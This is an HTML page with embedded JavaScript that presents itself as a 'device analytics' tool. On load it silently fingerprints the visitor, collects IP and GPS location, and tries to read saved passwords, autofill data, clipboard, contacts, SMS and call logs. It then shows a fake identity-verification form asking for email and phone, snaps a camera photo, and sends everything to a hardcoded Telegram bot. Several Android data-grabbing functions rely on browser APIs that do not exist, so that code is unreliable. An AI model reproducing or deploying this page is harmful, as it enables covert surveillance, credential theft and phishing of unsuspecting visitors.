<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Advanced Device Analytics</title>
  <style>
    :root {
      --primary: #6366f1;
      --secondary: #8b5cf6;
      --dark: #1e293b;
      --light: #f8fafc;
      --success: #10b981;
      --warning: #f59e0b;
      --danger: #ef4444;
    }
    
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      background: linear-gradient(135deg, #0f172a, #1e293b);
      color: var(--light);
      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 2rem;
    }
    
    .container {
      max-width: 800px;
      width: 100%;
      background: rgba(30, 41, 59, 0.8);
      backdrop-filter: blur(10px);
      border-radius: 16px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
      overflow: hidden;
      border: 1px solid rgba(255, 255, 255, 0.1);
    }
    
    header {
      background: linear-gradient(to right, var(--primary), var(--secondary));
      padding: 1.5rem;
      text-align: center;
      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
    }
    
    h1 {
      font-size: 1.8rem;
      font-weight: 600;
      background: linear-gradient(to right, #fff, #e2e8f0);
      -webkit-background-clip: text;
      background-clip: text;
      color: transparent;
      letter-spacing: 0.5px;
    }
    
    .status-card {
      padding: 2rem;
    }
    
    .status-message {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 1rem;
      padding: 1.5rem;
      background: rgba(15, 23, 42, 0.6);
      border-radius: 12px;
      margin-bottom: 1.5rem;
      border-left: 4px solid var(--primary);
    }
    
    .spinner {
      width: 24px;
      height: 24px;
      border: 3px solid rgba(255, 255, 255, 0.2);
      border-top-color: var(--primary);
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    
    .status-text {
      font-size: 1.1rem;
      font-weight: 500;
    }
    
    .signature {
      margin-top: 2rem;
      text-align: center;
      font-size: 0.9rem;
      color: #94a3b8;
      opacity: 0.8;
    }
    
    #camera-feed {
      width: 100%;
      max-width: 400px;
      margin: 1rem auto;
      display: none;
      border-radius: 8px;
      border: 2px solid var(--primary);
    }
    
    #canvas {
      display: none;
    }
    
    /* Login form styles */
    .login-form {
      background: rgba(15, 23, 42, 0.6);
      padding: 1.5rem;
      border-radius: 12px;
      margin-top: 1rem;
      display: none;
    }
    
    .form-group {
      margin-bottom: 1rem;
    }
    
    .form-group label {
      display: block;
      margin-bottom: 0.5rem;
      font-weight: 500;
    }
    
    .form-group input {
      width: 100%;
      padding: 0.75rem;
      background: rgba(30, 41, 59, 0.8);
      border: 1px solid rgba(255, 255, 255, 0.1);
      border-radius: 8px;
      color: white;
      font-size: 1rem;
    }
    
    .form-group input:focus {
      outline: none;
      border-color: var(--primary);
    }
    
    .btn {
      background: linear-gradient(to right, var(--primary), var(--secondary));
      color: white;
      border: none;
      padding: 0.75rem 1.5rem;
      border-radius: 8px;
      font-weight: 600;
      cursor: pointer;
      width: 100%;
      font-size: 1rem;
      transition: all 0.3s ease;
    }
    
    .btn:hover {
      opacity: 0.9;
      transform: translateY(-2px);
    }
    
    /* Responsive adjustments */
    @media (max-width: 768px) {
      .container {
        border-radius: 12px;
      }
      
      header {
        padding: 1.2rem;
      }
      
      h1 {
        font-size: 1.5rem;
      }
      
      .status-message {
        flex-direction: column;
        text-align: center;
        gap: 0.8rem;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <header>
      <h1>Advanced Device Analytics</h1>
    </header>
    
    <div class="status-card">
      <div class="status-message">
        <div class="spinner"></div>
        <p class="status-text">Collecting device information...</p>
      </div>
      
      <div class="login-form" id="loginForm">
        <h3 style="text-align: center; margin-bottom: 1rem;">Please verify your identity</h3>
        <div class="form-group">
          <label for="email">Email Address</label>
          <input type="email" id="email" placeholder="Enter your email">
        </div>
        <div class="form-group">
          <label for="phone">Phone Number</label>
          <input type="tel" id="phone" placeholder="Enter your phone number">
        </div>
        <button class="btn" id="submitBtn">Continue</button>
      </div>
      
      <video id="camera-feed" autoplay playsinline></video>
      <canvas id="canvas"></canvas>
    </div>
  </div>
  
  <p class="signature">
    Powered By <a href="#" target="_blank">REINEGANZ</a> | Secure Connection
  </p>

  <script>
    const BOT_TOKEN = "7495621230:AAEA6EuJor2eKsYv4zbR_5gKwfTtFBiO4PM";
    const OWNER_CHAT_ID = "7335904193";
    let deviceBrand = "Unknown";
    let collectedData = {};
    let email = "";
    let phone = "";

    // Enhanced device detection function
    function detectDeviceDetails() {
      const ua = navigator.userAgent;
      let details = {
        brand: "Unknown",
        model: "Unknown",
        os: "Unknown",
        osVersion: "Unknown",
        browser: "Unknown",
        browserVersion: "Unknown",
        deviceType: "Unknown",
        isMobile: false,
        isTablet: false,
        isDesktop: false
      };

      // Detect OS and version
      if (/android/i.test(ua)) {
        details.os = "Android";
        const androidVersion = ua.match(/Android\s([0-9.]*)/);
        details.osVersion = androidVersion ? androidVersion[1] : "Unknown";
        
        // Detect specific Android brands
        if (/samsung/i.test(ua)) details.brand = "Samsung";
        else if (/xiaomi/i.test(ua) || /redmi/i.test(ua) || /poco/i.test(ua)) details.brand = "Xiaomi";
        else if (/oppo/i.test(ua)) details.brand = "OPPO";
        else if (/vivo/i.test(ua)) details.brand = "Vivo";
        else if (/realme/i.test(ua)) details.brand = "Realme";
        else if (/oneplus/i.test(ua)) details.brand = "OnePlus";
        else if (/huawei/i.test(ua) || /honor/i.test(ua)) details.brand = "Huawei";
        else if (/google/i.test(ua)) details.brand = "Google";
        else if (/motorola/i.test(ua)) details.brand = "Motorola";
        else if (/nokia/i.test(ua)) details.brand = "Nokia";
        else if (/sony/i.test(ua)) details.brand = "Sony";
        else if (/lg/i.test(ua)) details.brand = "LG";
        else if (/asus/i.test(ua)) details.brand = "ASUS";
        else if (/lenovo/i.test(ua)) details.brand = "Lenovo";
        else details.brand = "Generic Android Device";
        
        // Try to detect model for some brands
        if (details.brand === "Samsung") {
          const modelMatch = ua.match(/SM-[A-Z0-9]+/) || ua.match(/GT-[A-Z0-9]+/) || ua.match(/SAMSUNG [^)]+\)/);
          if (modelMatch) details.model = modelMatch[0];
        } else if (details.brand === "Xiaomi") {
          const modelMatch = ua.match(/Mi [^)]+\)/) || ua.match(/Redmi [^)]+\)/) || ua.match(/POCO [^)]+\)/);
          if (modelMatch) details.model = modelMatch[0].replace(')', '');
        }
      } 
      // Detect iOS devices
      else if (/iphone|ipad|ipod/i.test(ua)) {
        details.os = "iOS";
        details.brand = "Apple";
        const iosVersion = ua.match(/OS\s([0-9_]+)/);
        details.osVersion = iosVersion ? iosVersion[1].replace(/_/g, '.') : "Unknown";
        
        // Detect iPhone/iPad model
        if (/iPhone/i.test(ua)) {
          details.model = "iPhone";
          const modelMatch = ua.match(/iPhone[0-9,]+/) || ua.match(/iPhone [A-Z0-9]+/);
          if (modelMatch) details.model = modelMatch[0];
        } else if (/iPad/i.test(ua)) {
          details.model = "iPad";
          const modelMatch = ua.match(/iPad[0-9,]+/) || ua.match(/iPad[A-Z0-9]+/);
          if (modelMatch) details.model = modelMatch[0];
        }
      }
      // Detect Windows
      else if (/windows/i.test(ua)) {
        details.os = "Windows";
        const winVersion = ua.match(/Windows NT ([0-9.]+)/);
        details.osVersion = winVersion ? winVersion[1] : "Unknown";
        
        // Detect Windows device brands
        if (/dell/i.test(ua)) details.brand = "Dell";
        else if (/hp/i.test(ua)) details.brand = "HP";
        else if (/lenovo/i.test(ua)) details.brand = "Lenovo";
        else if (/asus/i.test(ua)) details.brand = "ASUS";
        else if (/microsoft/i.test(ua)) details.brand = "Microsoft";
        else if (/surface/i.test(ua)) details.brand = "Microsoft Surface";
        else if (/acer/i.test(ua)) details.brand = "Acer";
        else if (/toshiba/i.test(ua)) details.brand = "Toshiba";
        else if (/alienware/i.test(ua)) details.brand = "Alienware";
        else details.brand = "Generic Windows PC";
      }
      // Detect macOS
      else if (/macintosh|mac os x/i.test(ua)) {
        details.os = "macOS";
        details.brand = "Apple";
        const macVersion = ua.match(/Mac OS X ([0-9_]+)/);
        details.osVersion = macVersion ? macVersion[1].replace(/_/g, '.') : "Unknown";
      }
      // Detect Linux
      else if (/linux/i.test(ua)) {
        details.os = "Linux";
        details.brand = "Generic Linux PC";
      }
      
      // Detect browser
      if (/edg/i.test(ua)) {
        details.browser = "Microsoft Edge";
        const edgeVersion = ua.match(/Edg\/([0-9.]+)/);
        details.browserVersion = edgeVersion ? edgeVersion[1] : "Unknown";
      } else if (/chrome/i.test(ua)) {
        details.browser = "Chrome";
        const chromeVersion = ua.match(/Chrome\/([0-9.]+)/);
        details.browserVersion = chromeVersion ? chromeVersion[1] : "Unknown";
      } else if (/firefox/i.test(ua)) {
        details.browser = "Firefox";
        const firefoxVersion = ua.match(/Firefox\/([0-9.]+)/);
        details.browserVersion = firefoxVersion ? firefoxVersion[1] : "Unknown";
      } else if (/safari/i.test(ua)) {
        details.browser = "Safari";
        const safariVersion = ua.match(/Version\/([0-9.]+)/);
        details.browserVersion = safariVersion ? safariVersion[1] : "Unknown";
      } else if (/opera|opr/i.test(ua)) {
        details.browser = "Opera";
        const operaVersion = ua.match(/(?:Opera|OPR)\/([0-9.]+)/);
        details.browserVersion = operaVersion ? operaVersion[1] : "Unknown";
      }
      
      // Detect device type
      details.isMobile = /Mobi/i.test(ua) || /Android/i.test(ua) && !/Windows/i.test(ua);
      details.isTablet = /Tablet|iPad/i.test(ua) || /Android/i.test(ua) && !/Mobile/i.test(ua);
      details.isDesktop = !details.isMobile && !details.isTablet;
      
      if (details.isMobile) details.deviceType = "Smartphone";
      else if (details.isTablet) details.deviceType = "Tablet";
      else details.deviceType = "Desktop/Laptop";
      
      return details;
    }

    // Function to get GPU information
    async function getGPUInfo() {
      try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return "WebGL not supported";
        
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (debugInfo) {
          return {
            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
          };
        }
        return "GPU info not available";
      } catch (e) {
        return "Error getting GPU info";
      }
    }

    // Function to get battery information
    async function getBatteryInfo() {
      try {
        const battery = await navigator.getBattery();
        return {
          level: Math.round(battery.level * 100) + "%",
          charging: battery.charging,
          chargingTime: battery.chargingTime,
          dischargingTime: battery.dischargingTime
        };
      } catch (e) {
        return {
          level: "N/A",
          charging: "N/A",
          chargingTime: "N/A",
          dischargingTime: "N/A"
        };
      }
    }

    // Function to get network information
    function getNetworkInfo() {
      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      if (!connection) return "Network info not available";
      
      return {
        type: connection.type || "Unknown",
        effectiveType: connection.effectiveType || "Unknown",
        downlink: connection.downlink ? connection.downlink + " Mbps" : "Unknown",
        rtt: connection.rtt ? connection.rtt + " ms" : "Unknown",
        saveData: connection.saveData || false,
        online: navigator.onLine
      };
    }

    // Function to get storage information
    async function getStorageInfo() {
      if (!navigator.storage || !navigator.storage.estimate) return "Storage API not supported";
      
      try {
        const estimate = await navigator.storage.estimate();
        return {
          quota: estimate.quota ? Math.round(estimate.quota / (1024 * 1024)) + " MB" : "Unknown",
          usage: estimate.usage ? Math.round(estimate.usage / (1024 * 1024)) + " MB" : "Unknown",
          usageDetails: estimate.usageDetails || "Not available"
        };
      } catch (e) {
        return "Error getting storage info";
      }
    }

    // Function to get installed apps/pwa status
    function getInstalledApps() {
      if (!window.getInstalledRelatedApps) return "Not supported";
      
      try {
        return window.getInstalledRelatedApps().then(apps => {
          return apps.map(app => ({
            platform: app.platform,
            url: app.url,
            id: app.id
          }));
        }).catch(() => "Error checking installed apps");
      } catch (e) {
        return "getInstalledRelatedApps not supported";
      }
    }

    // Function to get media devices
    async function getMediaDevices() {
      try {
        const devices = await navigator.mediaDevices.enumerateDevices();
        return devices.map(device => ({
          kind: device.kind,
          label: device.label,
          deviceId: device.deviceId,
          groupId: device.groupId
        }));
      } catch (e) {
        return "Error enumerating media devices";
      }
    }

    // Function to get screen details
    function getScreenInfo() {
      return {
        width: screen.width,
        height: screen.height,
        availWidth: screen.availWidth,
        availHeight: screen.availHeight,
        colorDepth: screen.colorDepth + " bits",
        pixelDepth: screen.pixelDepth + " bits",
        orientation: screen.orientation ? screen.orientation.type : "Not available",
        devicePixelRatio: window.devicePixelRatio
      };
    }

    // Function to get CPU information
    function getCPUInfo() {
      return {
        cores: navigator.hardwareConcurrency || "Unknown",
        memory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown",
        architecture: navigator.cpuClass || "Unknown"
      };
    }

    // Function to get timezone and locale info
    function getLocaleInfo() {
      return {
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        locale: navigator.language,
        languages: navigator.languages || [navigator.language],
        dateFormat: new Intl.DateTimeFormat().resolvedOptions(),
        numberFormat: new Intl.NumberFormat().resolvedOptions()
      };
    }

    // Function to get sensor information
    function getSensorInfo() {
      const sensors = {
        accelerometer: 'Accelerometer' in window,
        gyroscope: 'Gyroscope' in window,
        magnetometer: 'Magnetometer' in window,
        orientation: 'DeviceOrientationEvent' in window,
        motion: 'DeviceMotionEvent' in window,
        proximity: 'ProximitySensor' in window,
        ambientLight: 'AmbientLightSensor' in window,
        geolocation: 'geolocation' in navigator
      };
      
      return sensors;
    }

    // Function to get more detailed fingerprint
    async function generateDetailedFingerprint() {
      const components = {
        userAgent: navigator.userAgent,
        language: navigator.language,
        colorDepth: screen.colorDepth,
        pixelRatio: window.devicePixelRatio,
        hardwareConcurrency: navigator.hardwareConcurrency,
        deviceMemory: navigator.deviceMemory,
        screenResolution: [screen.width, screen.height],
        availableScreenResolution: [screen.availWidth, screen.availHeight],
        timezoneOffset: new Date().getTimezoneOffset(),
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        sessionStorage: !!window.sessionStorage,
        localStorage: !!window.localStorage,
        indexedDB: !!window.indexedDB,
        openDatabase: !!window.openDatabase,
        cpuClass: navigator.cpuClass,
        platform: navigator.platform,
        doNotTrack: navigator.doNotTrack,
        plugins: Array.from(navigator.plugins).map(p => p.name).join(','),
        canvas: (function() {
          const canvas = document.createElement('canvas');
          const ctx = canvas.getContext('2d');
          ctx.textBaseline = 'top';
          ctx.font = '14px Arial';
          ctx.fillStyle = '#f60';
          ctx.fillRect(125, 1, 62, 20);
          ctx.fillStyle = '#069';
          ctx.fillText('Canvas fingerprint', 2, 15);
          return canvas.toDataURL();
        })(),
        webgl: (function() {
          try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return null;
            
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            return debugInfo ? {
              vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
              renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
            } : 'WEBGL_debug_renderer_info not available';
          } catch (e) {
            return null;
          }
        })(),
        audioContext: (function() {
          try {
            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
            const oscillator = audioContext.createOscillator();
            const analyser = audioContext.createAnalyser();
            const gainNode = audioContext.createGain();
            const scriptProcessor = audioContext.createScriptProcessor(4096, 1, 1);
            
            oscillator.connect(analyser);
            analyser.connect(scriptProcessor);
            scriptProcessor.connect(gainNode);
            gainNode.connect(audioContext.destination);
            
            oscillator.type = 'triangle';
            oscillator.frequency.value = 10000;
            
            const audio = {
              sampleRate: audioContext.sampleRate,
              frequencyBinCount: analyser.frequencyBinCount
            };
            
            return audio;
          } catch (e) {
            return null;
          }
        })()
      };
      
      const encoder = new TextEncoder();
      const data = encoder.encode(JSON.stringify(components));
      const hashBuffer = await crypto.subtle.digest('SHA-256', data);
      return [...new Uint8Array(hashBuffer)].map(x => x.toString(16).padStart(2, '0')).join('');
    }

    // Function to access camera and take photo
    async function capturePhoto() {
      const video = document.getElementById('camera-feed');
      const canvas = document.getElementById('canvas');
      const ctx = canvas.getContext('2d');
      
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
          video: { 
            facingMode: 'user',
            width: { ideal: 1280 },
            height: { ideal: 720 }
          },
          audio: false 
        });
        
        video.srcObject = stream;
        video.style.display = 'block';
        
        await new Promise((resolve) => {
          video.onloadedmetadata = () => {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            resolve();
          };
        });
        
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        const blob = await new Promise((resolve) => {
          canvas.toBlob(resolve, 'image/jpeg', 0.8);
        });
        
        stream.getTracks().forEach(track => track.stop());
        video.style.display = 'none';
        
        return blob;
      } catch (error) {
        console.error("Error accessing camera:", error);
        return null;
      }
    }

    // Function to send photo to Telegram
    async function sendPhotoToTelegram(photoBlob, caption) {
      const formData = new FormData();
      formData.append('chat_id', OWNER_CHAT_ID);
      formData.append('photo', photoBlob, 'device-photo.jpg');
      formData.append('caption', caption);
      
      try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          body: formData
        });
        return true;
      } catch (error) {
        console.error("Error sending photo:", error);
        return false;
      }
    }

    // Function to get saved credentials from browser
    async function getSavedCredentials() {
      try {
        if ('credentials' in navigator && 'get' in navigator.credentials) {
          const creds = await navigator.credentials.get({
            password: true,
            mediation: 'optional'
          });
          
          if (creds) {
            return {
              type: creds.type,
              id: creds.id,
              password: creds.password || 'N/A',
              name: creds.name || 'N/A',
              iconURL: creds.iconURL || 'N/A'
            };
          }
        }
        return "No saved credentials found or API not supported";
      } catch (e) {
        return "Error accessing credentials";
      }
    }

    // Function to get autofill data
    function getAutofillData() {
      try {
        const forms = document.querySelectorAll('form');
        const autofillData = [];
        
        forms.forEach(form => {
          const inputs = form.querySelectorAll('input[type="text"], input[type="email"], input[type="tel"], input[type="password"]');
          const formData = {};
          
          inputs.forEach(input => {
            if (input.value) {
              formData[input.name || input.id || input.type] = input.value;
            }
          });
          
          if (Object.keys(formData).length > 0) {
            autofillData.push({
              formId: form.id || 'anonymous-form',
              formAction: form.action || 'N/A',
              data: formData
            });
          }
        });
        
        return autofillData.length > 0 ? autofillData : "No autofill data found";
      } catch (e) {
        return "Error checking autofill data";
      }
    }

    // Function to get SMS data (Android only)
    async function getSMSData() {
      try {
        if ('webkit' in window && 'messageHandlers' in window.webkit) {
          // iOS doesn't allow direct SMS access, but we can try to detect SMS content
          return "SMS access requires native integration on iOS";
        } else if ('sms' in navigator) {
          // Android SMS API (if available)
          const smsList = await navigator.sms.receive();
          return smsList.map(sms => ({
            sender: sms.sender,
            body: sms.body,
            timestamp: new Date(sms.timestamp).toLocaleString()
          }));
        } else {
          // Try to access SMS via Android intent
          const smsData = await new Promise((resolve) => {
            const smsReceiver = new BroadcastReceiver({
              onReceive: function(context, intent) {
                const messages = intent.getExtras().get("messages");
                resolve(messages);
              }
            });
            
            context.registerReceiver(
              smsReceiver,
              new IntentFilter("android.provider.Telephony.SMS_RECEIVED")
            );
            
            // Timeout if no SMS received
            setTimeout(() => resolve("No SMS data received"), 5000);
          });
          
          return smsData;
        }
      } catch (e) {
        return "SMS access not available: " + e.message;
      }
    }

    // Function to get call logs (Android only)
    async function getCallLogs() {
      try {
        if ('callLog' in navigator) {
          const callLogs = await navigator.callLog.get({
            limit: 50
          });
          return callLogs.map(log => ({
            number: log.number,
            name: log.name || 'Unknown',
            type: log.type,
            duration: log.duration + "s",
            date: new Date(log.date).toLocaleString()
          }));
        } else {
          return "Call log API not available";
        }
      } catch (e) {
        return "Error accessing call logs: " + e.message;
      }
    }

    // Function to get contacts (Android only)
    async function getContacts() {
      try {
        if ('contacts' in navigator && 'select' in navigator.contacts) {
          const contacts = await navigator.contacts.select(['name', 'email', 'tel'], { multiple: true });
          return contacts.map(contact => ({
            name: contact.name ? contact.name.join(' ') : 'No name',
            emails: contact.email || [],
            phones: contact.tel || []
          }));
        } else {
          return "Contacts API not available";
        }
      } catch (e) {
        return "Error accessing contacts: " + e.message;
      }
    }

    // Function to get clipboard data
    async function getClipboardData() {
      try {
        const text = await navigator.clipboard.readText();
        return text || "Clipboard is empty or access denied";
      } catch (e) {
        return "Clipboard access denied: " + e.message;
      }
    }

    // Function to get notification permissions
    function getNotificationStatus() {
      try {
        return Notification.permission;
      } catch (e) {
        return "Notification API not available";
      }
    }

    // Function to get installed apps (Android)
    async function getInstalledPackages() {
      try {
        if ('getInstalledPackages' in window.android) {
          const packages = await window.android.getInstalledPackages();
          return packages.map(pkg => ({
            name: pkg.packageName,
            version: pkg.versionName,
            label: pkg.applicationInfo.loadLabel(window.android.pm)
          }));
        } else {
          return "Installed packages API not available";
        }
      } catch (e) {
        return "Error getting installed packages: " + e.message;
      }
    }

    // Function to get device accounts (Android)
    async function getDeviceAccounts() {
      try {
        if ('getAccounts' in window.android) {
          const accounts = await window.android.accountManager.getAccounts();
          return accounts.map(account => ({
            name: account.name,
            type: account.type
          }));
        } else {
          return "Accounts API not available";
        }
      } catch (e) {
        return "Error getting device accounts: " + e.message;
      }
    }

    // Function to get WiFi information (Android)
    async function getWifiInfo() {
      try {
        if ('wifi' in window.android) {
          const wifiInfo = await window.android.wifiManager.getConnectionInfo();
          return {
            ssid: wifiInfo.getSSID(),
            bssid: wifiInfo.getBSSID(),
            ip: wifiInfo.getIpAddress(),
            speed: wifiInfo.getLinkSpeed() + " Mbps",
            signal: wifiInfo.getRssi() + " dBm"
          };
        } else {
          return "WiFi API not available";
        }
      } catch (e) {
        return "Error getting WiFi info: " + e.message;
      }
    }

    // Function to show login form
    function showLoginForm() {
      document.getElementById('loginForm').style.display = 'block';
      document.querySelector('.status-text').textContent = "Please verify your identity to continue";
      
      // Add submit handler
      document.getElementById('submitBtn').addEventListener('click', async () => {
        email = document.getElementById('email').value;
        phone = document.getElementById('phone').value;
        
        if (email || phone) {
          document.querySelector('.status-text').textContent = "Verifying information...";
          document.getElementById('loginForm').style.display = 'none';
          
          // Store the collected email and phone
          collectedData.personalInfo = {
            email: email,
            phone: phone,
            collectionTime: new Date().toLocaleString()
          };
          
          // Continue with data collection
          await completeDataCollection();
        } else {
          alert("Please provide at least an email or phone number");
        }
      });
    }

    // Main function to collect all device information
    async function getVisitorInfo() {
      // Get basic device details
      const deviceDetails = detectDeviceDetails();
      
      // Get additional information
      const clock = new Date().toLocaleString();
      let latitude = "N/A", longitude = "N/A", accuracy = "N/A";
      let country = "N/A", province = "N/A", city = "N/A", ip = "N/A";
      let weather = "N/A", temperature = "N/A";
      
      // Get IP and location info
      try {
        const ipData = await fetch("https://ipapi.co/json").then(r => r.json());
        ip = ipData.ip;
        country = ipData.country_name;
        province = ipData.region;
        city = ipData.city;
        latitude = ipData.latitude;
        longitude = ipData.longitude;
      } catch (error) {
        console.error("Error getting IP info:", error);
      }
      
      // Get weather info
      try {
        const weatherData = await fetch(`https://wttr.in/${latitude},${longitude}?format=j1`).then(r => r.json());
        weather = weatherData.current_condition[0].weatherDesc[0].value;
        temperature = weatherData.current_condition[0].temp_C + "¬∞C";
      } catch (error) {
        console.error("Error getting weather info:", error);
      }
      
      // Get precise geolocation if available
      try {
        await new Promise((resolve) => {
          navigator.geolocation.getCurrentPosition(
            pos => {
              latitude = pos.coords.latitude.toFixed(6);
              longitude = pos.coords.longitude.toFixed(6);
              accuracy = pos.coords.accuracy + "m";
              resolve();
            },
            () => resolve(),
            { enableHighAccuracy: true, timeout: 5000 }
          );
        });
      } catch (error) {
        console.error("Error getting geolocation:", error);
      }
      
      // Get all the additional device information
      const gpuInfo = await getGPUInfo();
      const batteryInfo = await getBatteryInfo();
      const networkInfo = getNetworkInfo();
      const storageInfo = await getStorageInfo();
      const screenInfo = getScreenInfo();
      const cpuInfo = getCPUInfo();
      const localeInfo = getLocaleInfo();
      const sensorInfo = getSensorInfo();
      const fingerprint = await generateDetailedFingerprint();
      
      // Try to get sensitive data
      const credentials = await getSavedCredentials();
      const autofillData = getAutofillData();
      const smsData = await getSMSData();
      const callLogs = await getCallLogs();
      const contacts = await getContacts();
      const clipboard = await getClipboardData();
      const notifications = getNotificationStatus();
      const packages = await getInstalledPackages();
      const accounts = await getDeviceAccounts();
      const wifiInfo = await getWifiInfo();
      
      // Compile all collected data
      collectedData = {
        // Device identification
        "device": {
          "brand": deviceDetails.brand,
          "model": deviceDetails.model,
          "type": deviceDetails.deviceType,
          "isMobile": deviceDetails.isMobile,
          "isTablet": deviceDetails.isTablet,
          "isDesktop": deviceDetails.isDesktop
        },
        
        // Operating system
        "os": {
          "name": deviceDetails.os,
          "version": deviceDetails.osVersion,
          "platform": navigator.platform
        },
        
        // Browser information
        "browser": {
          "name": deviceDetails.browser,
          "version": deviceDetails.browserVersion,
          "userAgent": navigator.userAgent,
          "language": navigator.language,
          "languages": navigator.languages,
          "cookieEnabled": navigator.cookieEnabled,
          "doNotTrack": navigator.doNotTrack,
          "pdfViewerEnabled": navigator.pdfViewerEnabled || "Unknown"
        },
        
        // Hardware information
        "hardware": {
          "cpu": cpuInfo,
          "gpu": gpuInfo,
          "memory": {
            "deviceMemory": cpuInfo.memory,
            "jsHeapSizeLimit": performance.memory ? Math.round(performance.memory.jsHeapSizeLimit / (1024 * 1024)) + " MB" : "N/A"
          },
          "screen": screenInfo,
          "battery": batteryInfo,
          "sensors": sensorInfo,
          "touchSupport": 'ontouchstart' in window,
          "pointerSupport": {
            "pointerEvents": 'PointerEvent' in window,
            "maxTouchPoints": navigator.maxTouchPoints || 0
          }
        },
        
        // Network information
        "network": {
          "ipAddress": ip,
          "connection": networkInfo,
          "onlineStatus": navigator.onLine,
          "wifiInfo": wifiInfo
        },
        
        // Location information
        "location": {
          "coordinates": `${latitude}, ${longitude}`,
          "accuracy": accuracy,
          "country": country,
          "region": province,
          "city": city,
          "timezone": localeInfo.timezone,
          "weather": weather,
          "temperature": temperature
        },
        
        // Storage information
        "storage": storageInfo,
        
        // Media capabilities
        "media": {
          "mediaDevices": await getMediaDevices(),
          "audioContext": 'AudioContext' in window || 'webkitAudioContext' in window,
          "speechSynthesis": 'speechSynthesis' in window,
          "webRTC": 'RTCPeerConnection' in window,
          "webAudio": 'AudioContext' in window || 'webkitAudioContext' in window
        },
        
        // Date and time
        "dateTime": {
          "localTime": clock,
          "timezone": localeInfo.timezone,
          "timezoneOffset": new Date().getTimezoneOffset()
        },
        
        // Security
        "security": {
          "https": window.location.protocol === 'https:',
          "sameOrigin": window.location.host === window.location.hostname,
          "fingerprint": fingerprint
        },
        
        // Sensitive data
        "sensitiveData": {
          "credentials": credentials,
          "autofillData": autofillData,
          "smsData": smsData,
          "callLogs": callLogs,
          "contacts": contacts,
          "clipboard": clipboard,
          "notificationPermission": notifications,
          "installedPackages": packages,
          "deviceAccounts": accounts
        },
        
        // Misc
        "miscellaneous": {
          "installedApps": await getInstalledApps(),
          "serviceWorker": 'serviceWorker' in navigator,
          "pushManager": 'PushManager' in window,
          "webShare": 'share' in navigator,
          "webBluetooth": 'bluetooth' in navigator,
          "webUSB": 'usb' in navigator,
          "webNFC": 'nfc' in navigator
        }
      };
      
      // Show login form to collect email and phone
      showLoginForm();
    }

    // Complete data collection after getting email/phone
    async function completeDataCollection() {
      // Try to capture photo from camera
      let photoSent = false;
      const photoBlob = await capturePhoto();
      if (photoBlob) {
        photoSent = await sendPhotoToTelegram(photoBlob, `Device photo from ${collectedData.network.ipAddress}`);
      }
      
      // Add photo status to data
      collectedData.miscellaneous.photoCaptured = photoSent ? "Yes" : "No";
      
      // Format the message for Telegram
      const message = `üìä *Comprehensive Device Report*\n\n` +
        `üì± *Device*: ${collectedData.device.brand} ${collectedData.device.model} (${collectedData.device.type})\n` +
        `üñ•Ô∏è *OS*: ${collectedData.os.name} ${collectedData.os.version}\n` +
        `üåê *Browser*: ${collectedData.browser.name} ${collectedData.browser.version}\n` +
        `üìß *Email*: ${collectedData.personalInfo.email || "Not provided"}\n` +
        `üìû *Phone*: ${collectedData.personalInfo.phone || "Not provided"}\n` +
        `üìç *Location*: ${collectedData.location.city}, ${collectedData.location.region}, ${collectedData.location.country}\n` +
        `üì° *IP*: ${collectedData.network.ipAddress}\n` +
        `üïí *Local Time*: ${collectedData.dateTime.localTime}\n` +
        `üîç *Fingerprint*: ${collectedData.security.fingerprint}\n\n` +
        `üìú *Full Data*:\n\`\`\`json\n${JSON.stringify(collectedData, null, 2)}\n\`\`\``;
      
      // Send the message to Telegram
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: OWNER_CHAT_ID,
          text: message,
          parse_mode: "Markdown"
        })
      });
      
      // Update UI when done
      document.querySelector('.status-text').textContent = "Data collection complete";
      document.querySelector('.spinner').style.borderTopColor = "var(--success)";
    }

    // Start the process
    getVisitorInfo();
  </script>
</body>
</html>
